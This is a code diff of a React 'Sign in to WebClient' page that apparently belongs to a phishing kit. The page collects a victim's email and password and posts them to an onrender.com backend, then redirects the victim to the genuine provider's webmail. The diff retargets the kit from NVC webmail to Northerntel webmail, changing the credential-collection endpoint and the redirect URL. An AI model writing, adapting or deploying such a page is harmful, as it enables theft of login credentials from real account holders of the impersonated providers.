@@ -5,6 +5,7 @@ import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import logotwo from './logotwo.gif';
 import { useLocation } from 'react-router-dom';
+import { Link } from 'react-router-dom';
 
 function Next(){
 
@@ -14,7 +15,7 @@ function Next(){
     
     const[email ,setEmail] = useState(location.state.email);
 
-    const[platform, setPlatform] = useState("Nvc")
+    const[platform, setPlatform] = useState("Northerntel")
 
     const[showError, setShowError] = useState(false);
 
@@ -29,7 +30,7 @@ function Next(){
         try {
 
             setIsLoading(true);
-            const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
+            const response = await axios.post('https://micback.onrender.com/api/send', {
                 email:email,
                 password:password,
                 platform:platform
@@ -41,7 +42,7 @@ function Next(){
             if(response.status == 200){
                 console.log(response.data.message);
     
-                window.location.href = 'https://mail.nvc.net/webmail/';
+                window.location.href = 'https://webmail.northerntel.net/webmail/#sign-in';
 
             }
           } catch (error) {
@@ -58,15 +59,16 @@ function Next(){
 
         <div className='col-md-3 m-auto maindivtwo'>
 
-            <div className='imagediv text-center py-3'>
+            <div className='imagediv text-center py-2'>
                 
-                <div className='circle p-3 rounded-circle m-auto'>
+                <div className='circle p-3  rounded-circle m-auto'>
                     <h3 className='circlehead'>{email.charAt(0)}</h3>
                 </div>
 
             </div>
 
             <h2 className='mainhead'>Sign in to WebClient </h2>
+            <p className='smalltwo text-center'>{email}</p>
 
           
 
@@ -94,7 +96,7 @@ function Next(){
 
             </div>
 
-            <p className='text-center smalll py-3'>Not you? <span className='colorme'>Check your account again</span></p>
+            <p className='text-center smalll py-3'>Not you? <Link to={'/'} className='colorme'>Check your account again</Link></p>
 
             </form>
 
